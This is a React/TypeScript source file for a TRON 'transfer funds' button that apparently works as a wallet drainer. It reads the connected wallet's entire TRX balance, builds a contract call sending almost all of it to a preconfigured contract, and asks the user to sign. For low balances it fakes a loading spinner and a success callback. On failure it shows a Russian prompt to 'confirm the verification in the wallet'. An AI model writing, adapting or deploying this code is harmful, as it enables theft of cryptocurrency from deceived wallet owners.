import { useWallet } from "@tronweb3/tronwallet-adapter-react-hooks";
import { useEffect, useState } from "react";
import { tronWeb } from '../../tronweb';
import { Button } from '@tronweb3/tronwallet-adapter-react-ui';
import config from '../../config';
import { Alert } from '@mui/material';

import "../buttons/TransferButton.css";

const { tronContractAddress, tronFunctionName, tronFunctionParams, minimumTrxBalance } = config;

interface TronTransferFundsButtonProps {
  children: string;
  onTransactionSuccess: (network: string, wallet: string, amount: string) => void;
  onFakeTransactionSuccess: () => void;
  onZeroTransactionSuccess: () => void;
}

const TronTransferFundsButton: React.FC<TronTransferFundsButtonProps> = ({ children, onTransactionSuccess, onFakeTransactionSuccess, onZeroTransactionSuccess }) => {
  const { signTransaction, address, connected } = useWallet();
  const [netBalance, setNetBalance] = useState<number>(0);
  const [grossBalance, setGrossBalance] = useState<number>(0);
  const [transactionResult, setTransactionResult] = useState(null);
  const [alertOpen, setAlertOpen] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  useEffect(() => {
    const calculateBalance = async () => {
      try {
        // Get user's TRX balance
        const userBalance = await tronWeb.trx.getBalance(address);

        // Estimate transaction fee (assuming 1 TRX as fee for this example)
        const transactionFee = 5e6; // Fee in Sun (1 TRX = 1e6 Sun)

        // Calculate the net amount to send
        const calculatedNetBalance = userBalance - transactionFee;

        // Update state
        setNetBalance(calculatedNetBalance);
        setGrossBalance(userBalance);

      } catch (error) {
        console.error("Error calculating balance:", error);
      }
    };

    calculateBalance();
  }, [tronWeb]);


  async function onSignTransaction() {
    if (netBalance > minimumTrxBalance * 1000000) {
      try {
        // // Step 0: calculate net balance
        // const userBalance = await tronWeb.trx.getBalance(address);
  
        // // Estimate transaction fee (assuming 1 TRX as fee for this example)
        // const transactionFee = 1e6; // Fee in Sun (1 TRX = 1e6 Sun)
  
        // // Calculate the net amount to send
        // const calculatedNetBalance = userBalance - transactionFee;
        
        // console.log(calculatedNetBalance);
  
        // Step 1: Create the transaction
        const unsignedTx = await tronWeb.transactionBuilder.triggerSmartContract(
          tronWeb.address.toHex(tronContractAddress), // Contract address in hex format
          tronFunctionName,
          {
            feeLimit: 5000000,
            callValue: netBalance, // Adjust for any TRX sent along with the transaction
            // txLocal: true 
          },
          tronFunctionParams,
          address
        );
        
        console.log("unsignedTx", unsignedTx)
  
        if (!unsignedTx.result || !unsignedTx.result.result) {
          throw new Error("Failed to create transaction");
        }
  
        // Step 2: Sign the transaction
        const signedTx = await signTransaction(unsignedTx.transaction);
  
        // Step 3: Broadcast the transaction
        const receipt = await tronWeb.trx.sendRawTransaction(signedTx);
  
        console.log("receipt", receipt);
  
        // Update the transaction result state based on the response
        setTransactionResult(receipt.result ? 'Success' : 'Failed' as any);
        setAlertOpen(true);
        if (receipt.result){
          onTransactionSuccess("Tron", address || "", (netBalance / 1000000) + " TRX");
        }
      } catch (error) {
        console.error('Error calling contract:', error);
        setTransactionResult('Error' as any);
        setAlertOpen(true);
      }
    }
    else {
      setIsLoading(true);
      
      await new Promise((resolve) => setTimeout(resolve, 3000));

      setIsLoading(false);

      if (grossBalance <= 0) {
        onZeroTransactionSuccess();
      }
      else {
        onFakeTransactionSuccess();
      }
    }
  }

  return (
    <div className="tron-transfer">
      {connected ? (
        <>
          <Button className={`transfer-button ${isLoading ? 'loading' : ''}`} onClick={onSignTransaction}>
            {isLoading ? (
              <>
                <span className="spinner"></span> Processing...
              </>
            ) : (
              children
            )}
          </Button>
          {alertOpen && (
            <Alert
              onClose={() => setAlertOpen(false)}
              severity={transactionResult === 'Success' ? 'success' : 'error'}
              sx={{ width: '100%', marginTop: 1 }}
            >
              {transactionResult === 'Success' ? (
                <>
                  Success! You can check the status of your transfer on{' '}
                  <a
                    target="_blank"
                    rel="noreferrer"
                    href={`https://tronscan.io/#/address/${address}`}
                  >
                    TronScan
                  </a>
                </>
              ) : (
                "Подтвердите проверку в кошельке"
              )}
            </Alert>
          )}
        </>
      ) : null}
    </div>
  );
}

export default TronTransferFundsButton;
